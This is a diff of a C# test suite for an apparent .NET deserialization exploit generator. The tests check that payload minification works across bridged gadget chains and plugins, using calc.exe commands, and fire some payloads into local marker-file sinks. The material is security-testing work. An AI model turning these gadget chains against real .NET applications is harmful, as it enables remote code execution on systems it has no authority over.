@@ -142,7 +142,9 @@ namespace ysonet.Tests
                 Run("Payloads fire into test-owned sinks (marker/listener/tempdir/self-cs)", PayloadsFireIntoTestSinks);
                 Run("Output encodings correct per formatter (representative gadgets)", OutputEncodingPerFormatter);
                 Run("Bridged gadget chains (--bgc) generate for every consumer", BridgedChainsGenerate);
+                Run("Bridged chains propagate --minify to the whole chain (raw vs min)", BridgedChainsMinifyPropagates);
                 Run("Every plugin mode/CVE/inner-gadget generates (x minify)", PluginFullMatrixGenerates);
+                Run("Plugins pass --minify into the gadget they wrap (raw vs min)", PluginsPassMinifyToGadgets);
             }
 
             Console.Error.WriteLine();
@@ -2646,34 +2648,43 @@ namespace ysonet.Tests
             AssertTrue(XmlWellFormednessError(xaml) == null, "gspv Xaml stays well-formed XML");
         }
 
-        // Locks the GetterSettingsPropertyValue Xaml structural minify. Its Xaml branch used to
-        // skip the minifier entirely (the byte array dominates, but the namespaces/prefixes were
-        // never shrunk). The minify path first collapses the two same-element duplicate namespaces
-        // the XmlMinifier dedup cannot handle, then minifies. The minified payload must be smaller,
-        // stay well-formed, and keep the compact bare <Byte> array. Firing the minified payload is
-        // covered in PayloadsFireIntoTestSinks.
+        // Locks the GetterSettingsPropertyValue Xaml minify. The un-minified form emits the whole
+        // BinaryFormatter payload as a per-byte <Byte> array (tens of KB). The minified form drops
+        // that array entirely and passes the payload as a base64 STRING in SerializedValue, with
+        // the owning SettingsProperty marked SerializeAs="Binary"; SettingsPropertyValue then does
+        // Convert.FromBase64String + BinaryFormatter.Deserialize itself. That is a ~90% cut. The
+        // minified payload must be far smaller, stay well-formed, carry no <Byte> array, use the
+        // base64-string + SerializeAs=Binary shape, and the base64 must decode to a real
+        // BinaryFormatter stream. Firing the minified payload is covered in PayloadsFireIntoTestSinks.
         private static void GspvXamlMinifies()
         {
             string plain = GenerateGspvXaml(false);
             string min = GenerateGspvXaml(true);
             AssertTrue(!string.IsNullOrEmpty(plain) && !string.IsNullOrEmpty(min), "gspv Xaml generates both ways");
-            AssertTrue(min.Length < plain.Length,
-                "gspv Xaml is minified (" + min.Length + " < " + plain.Length + ")");
+            AssertTrue(min.Length < plain.Length / 2,
+                "gspv Xaml minify is a large cut (" + min.Length + " << " + plain.Length + ")");
             AssertTrue(XmlWellFormednessError(min) == null, "minified gspv Xaml is well-formed");
-            AssertTrue(min.IndexOf("<Byte>", StringComparison.Ordinal) >= 0,
-                "the compact bare <Byte> array survives minification");
-            AssertTrue(min.IndexOf("<s:Byte>", StringComparison.Ordinal) < 0,
-                "minification does not reintroduce the s:Byte prefix");
-            // Structural lock: the byte array shrinks with --minify even without this fix (the
-            // inner BF blob is minified), so also prove the XAML STRUCTURE was minified. The
-            // verbose "assembly" namespace prefix (present twice in the raw template) is renamed
-            // to a single letter, so it must be gone; the same-element duplicate xmlns:x too.
-            AssertTrue(plain.IndexOf("xmlns:assembly=", StringComparison.Ordinal) >= 0,
-                "sanity: the un-minified template still has the verbose xmlns:assembly");
-            AssertTrue(min.IndexOf("xmlns:assembly=", StringComparison.Ordinal) < 0,
-                "the verbose namespace prefixes are shortened (structural minify ran)");
-            AssertTrue(min.IndexOf("xmlns:x=", StringComparison.Ordinal) < 0,
-                "the same-element duplicate xmlns:x is collapsed before minifying");
+            // The per-byte array (present un-minified) is gone; a single base64 string replaces it.
+            AssertTrue(plain.IndexOf("<Byte>", StringComparison.Ordinal) >= 0,
+                "sanity: the un-minified form uses the per-byte <Byte> array");
+            AssertTrue(min.IndexOf("<Byte>", StringComparison.Ordinal) < 0,
+                "the minified form drops the per-byte <Byte> array");
+            AssertTrue(min.IndexOf("SerializeAs=\"Binary\"", StringComparison.Ordinal) >= 0,
+                "the minified form marks SettingsProperty SerializeAs=Binary so the base64-string path runs");
+            // Integrity: pull the SerializedValue string back out and prove it is the real
+            // BinaryFormatter payload (magic header 00 01 00 00 00 FF FF FF FF), not garbage. A
+            // truncated or mangled array would fail this even if the XML stayed well-formed.
+            const string open = ".SerializedValue><s:String>";
+            int a = min.IndexOf(open, StringComparison.Ordinal);
+            AssertTrue(a >= 0, "the minified form passes SerializedValue as a base64 string");
+            a += open.Length;
+            int b = min.IndexOf("</s:String>", a, StringComparison.Ordinal);
+            AssertTrue(b > a, "the base64 SerializedValue string is terminated");
+            byte[] bf = Convert.FromBase64String(min.Substring(a, b - a));
+            byte[] head = new byte[] { 0, 1, 0, 0, 0, 255, 255, 255, 255 };
+            bool okHead = bf.Length > head.Length;
+            for (int i = 0; okHead && i < head.Length; i++) if (bf[i] != head[i]) okHead = false;
+            AssertTrue(okHead, "the SerializedValue base64 decodes to a BinaryFormatter stream");
         }
 
         // Generate a GetterSettingsPropertyValue Xaml payload as a string (command is a value
@@ -3349,6 +3360,167 @@ namespace ysonet.Tests
             }
         }
 
+        // Minify must propagate THROUGH a bridged gadget chain. PayloadRunner shares one InputArgs
+        // (and its Minify flag) across every gadget in the chain, so the leaf (bridge producer) and
+        // the consumer both have to minify. Proof the flag actually reached them: the minified
+        // chain output is strictly smaller than the non-minified one - the leaf's BF/Los/etc. blob
+        // shrinks with loose type names and the consumer embeds that smaller blob. If Minify were
+        // dropped anywhere in the chain the two outputs would be identical (== raw), which this
+        // test rejects. Every Bridged consumer is covered, and one chain is fired both ways to
+        // prove minify does not break bridged execution end to end.
+        private static void BridgedChainsMinifyPropagates()
+        {
+            var broken = new List<string>();
+            var noEffect = new List<string>();
+            int consumers = 0, shrank = 0;
+            foreach (string name in GadgetRegistry.GetAllGadgetNames())
+            {
+                if (name == "Generic") continue;
+                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
+                if (g == null || !g.Labels().Contains(GadgetTags.Bridged)) continue;
+                string bridgedFmt = g.SupportedBridgedFormatter();
+                if (string.IsNullOrEmpty(bridgedFmt)) continue; // e.g. WindowsPrincipal reports None
+
+                consumers++;
+                string leaf = bridgedFmt.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)
+                    ? "TextFormattingRunProperties" : "TypeConfuseDelegate";
+                string finalFmt = g.SupportedFormatters()[0].Split(' ')[0];
+
+                RunResult raw = BridgeGen(name, leaf, finalFmt, false);
+                RunResult min = BridgeGen(name, leaf, finalFmt, true);
+                string chain = leaf + "," + name + " -f " + finalFmt;
+                if (!raw.Success || RawIsEmpty(raw.Raw)) { broken.Add(chain + " -> raw " + (raw.Success ? "empty" : raw.ErrorMessage)); continue; }
+                if (!min.Success || RawIsEmpty(min.Raw)) { broken.Add(chain + " -> min " + (min.Success ? "empty" : min.ErrorMessage)); continue; }
+                int rl = RawLength(raw.Raw), ml = RawLength(min.Raw);
+                if (ml > rl) broken.Add(chain + " -> --minify GREW the payload (min=" + ml + " > raw=" + rl + ")");
+                else if (ml == rl) noEffect.Add(chain + " -> --minify changed nothing (both " + rl + " bytes); flag may not propagate");
+                else shrank++;
+            }
+
+            AssertTrue(consumers >= 13, "found the bridged consumers (was " + consumers + ")");
+            AssertTrue(broken.Count == 0,
+                "bridged chains failed or grew under --minify (" + broken.Count + "):\n  " + string.Join("\n  ", broken.ToArray()));
+            AssertTrue(noEffect.Count == 0,
+                "bridged chains where --minify had no effect - the flag likely did not reach the chain (" + noEffect.Count + "):\n  " + string.Join("\n  ", noEffect.ToArray()));
+            AssertTrue(shrank == consumers, "every bridged chain shrinks with --minify (" + shrank + "/" + consumers + ")");
+
+            // Fire the representative chain BOTH ways: minify must not break bridged execution.
+            FireBridgedChain(false);
+            FireBridgedChain(true);
+        }
+
+        private static RunResult BridgeGen(string consumer, string leaf, string finalFmt, bool minify)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe";
+            ia.Test = false;
+            ia.Minify = minify;
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = consumer,
+                BridgedGadgetChain = leaf,
+                FormatterName = finalFmt,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        private static void FireBridgedChain(bool minify)
+        {
+            string marker = MarkerPath("bgc_min_" + (minify ? "m" : "n"));
+            SafeDelete(marker);
+            try
+            {
+                InputArgs ia = new InputArgs();
+                ia.Cmd = MarkerCommand(marker);
+                ia.IsRawCmd = true;
+                ia.Test = false;
+                ia.Minify = minify;
+                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = "AxHostState",
+                    BridgedGadgetChain = "TypeConfuseDelegate",
+                    FormatterName = "BinaryFormatter",
+                    OutputFormat = "",
+                    InputArgs = ia,
+                });
+                AssertTrue(r.Success && r.Raw is byte[], "bridged chain generated (minify=" + minify + "): " + r.ErrorMessage);
+                RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])r.Raw); });
+                AssertTrue(WaitForFile(marker, 2500), "bridged TypeConfuseDelegate,AxHostState fired (minify=" + minify + ")");
+            }
+            finally { SafeDelete(marker); }
+        }
+
+        // Minify must propagate from a PLUGIN into the gadget it wraps. Each plugin below either
+        // sets InputArgs.Minify on the gadget it drives or calls the minifier on its own template;
+        // all expose --minify. Proof the flag reaches the gadget: the plugin payload is strictly
+        // smaller with --minify than without. A dropped flag would produce an identical payload,
+        // which this test rejects. Output is deterministic for these plugins (no random crypto IV),
+        // so a size comparison is a stable proxy.
+        //
+        // Deliberately NOT in the shrink list (each for a real reason, so the coverage is honest):
+        //  - Altserialization -M SessionStateItemCollection: the gadget object is serialized by
+        //    System.Web's SessionStateItemCollection.Serialize (stock BinaryFormatter), which the
+        //    minify flag cannot reach; only the HttpStaticObjectsCollection mode routes through
+        //    GenericGenerator.Serialize and minifies. Tracked in dev-kitchen/todo.
+        //  - MachineKeySessionSecurityTokenHandler, SessionSecurityTokenHandler: their MachineKey /
+        //    DPAPI transform randomizes the bytes, so neither size nor byte comparison can prove
+        //    propagation; their InputArgs.Minify = minify wiring is verified by code.
+        //  - ViewState, Resx: they load heavy System.Web / resgen assemblies; a second in-process
+        //    size probe on top of PluginFullMatrixGenerates trips a ReflectionTypeLoadException
+        //    (a load-resource artifact, not a minify issue). Their InputArgs.Minify = minify wiring
+        //    is verified by code and they generate minify off/on in the plugin matrix.
+        // The three template plugins below (GetterCallGadgets, NetNonRceGadgets, ThirdPartyGadgets)
+        // call the minifier on their own JSON/XAML string directly, so they exercise that path too.
+        private static void PluginsPassMinifyToGadgets()
+        {
+            string innerJson = MakeTempFile("ysonet_minprop_inner.json", "{}");
+            var cells = new List<PluginCell>
+            {
+                new PluginCell("Altserialization", new[] { "-M", "HttpStaticObjectsCollection", "-c", "calc.exe" }),
+                new PluginCell("ApplicationTrust", new[] { "-c", "calc.exe" }),
+                new PluginCell("DotNetNuke", new[] { "-m", "run_command", "-c", "calc.exe" }),
+                new PluginCell("GetterCallGadgets", new[] { "-g", "PropertyGrid", "-i", innerJson }),
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Json.NET", "-i", "http://localhost/y" }),
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Xaml", "-i", "http://localhost/y" }),
+                new PluginCell("ThirdPartyGadgets", new[] { "-g", "GetterActiveMQObjectMessage", "-f", "Json.NET", "-i", "calc.exe" }),
+                new PluginCell("TransactionManagerReenlist", new[] { "-c", "calc.exe" }),
+            };
+
+            var problems = new List<string>();
+            try
+            {
+                foreach (PluginCell cell in cells)
+                {
+                    IPlugin instance = PluginRegistry.CreatePluginInstance(cell.Plugin);
+                    AssertTrue(PluginHasMinify(instance), cell.Plugin + " exposes a --minify option");
+                    Type ptype = instance == null ? null : instance.GetType();
+
+                    ResetPluginStatics(ptype);
+                    RunResult raw = PayloadRunner.RunPlugin(cell.Plugin, cell.Argv);
+
+                    string[] margv = new string[cell.Argv.Length + 1];
+                    Array.Copy(cell.Argv, margv, cell.Argv.Length);
+                    margv[margv.Length - 1] = "--minify";
+                    ResetPluginStatics(ptype);
+                    RunResult min = PayloadRunner.RunPlugin(cell.Plugin, margv);
+
+                    string desc = cell.Plugin + " " + string.Join(" ", cell.Argv);
+                    if (!raw.Success || RawIsEmpty(raw.Raw)) { problems.Add(desc + " -> raw " + (raw.Success ? "empty" : raw.ErrorMessage)); continue; }
+                    if (!min.Success || RawIsEmpty(min.Raw)) { problems.Add(desc + " -> min " + (min.Success ? "empty" : min.ErrorMessage)); continue; }
+                    int rl = RawLength(raw.Raw), ml = RawLength(min.Raw);
+                    if (ml >= rl)
+                        problems.Add(desc + " -> --minify did not shrink (raw=" + rl + " min=" + ml + "); the flag may not reach the wrapped gadget");
+                }
+            }
+            finally
+            {
+                SafeDelete(innerJson);
+            }
+            AssertTrue(problems.Count == 0,
+                "plugin -> gadget minify propagation failed (" + problems.Count + "):\n  " + string.Join("\n  ", problems.ToArray()));
+        }
+
         // ---- 6.4 plugin combination matrix ----
 
         // One curated row per plugin mode / CVE / inner-gadget (plugin modes are not
@@ -3873,6 +4045,11 @@ namespace ysonet.Tests
             // so all three minifier families are covered end-to-end, not just BinaryFormatter.
             FireGadgetMarker("ObjectDataProvider", "Xaml", 1, true, false, "xaml", true, failures, ref fired, ref skipped, trace);
             FireGadgetMarker("GetterSettingsPropertyValue", "Xaml", 0, true, false, "xaml", true, failures, ref fired, ref skipped, trace);
+            // The minified gspv Xaml uses the compact base64-string form (SerializeAs=Binary)
+            // instead of the per-byte array. Fire it through a SECOND getter chain too: variant 2
+            // (ComboBox) reaches the getter via .Items, where variant 0 (PropertyGrid) uses
+            // .SelectedObject, so both wrapper shapes are proven to fire the base64 form.
+            FireGadgetMarker("GetterSettingsPropertyValue", "Xaml", 2, true, false, "xaml", true, failures, ref fired, ref skipped, trace);
             FireGadgetMarker("GetterSecurityException", "Json.NET", 0, true, false, "json", true, failures, ref fired, ref skipped, trace);
             FireGadgetMarker("GetterSettingsPropertyValue", "Json.NET", 0, true, false, "json", true, failures, ref fired, ref skipped, trace);
 
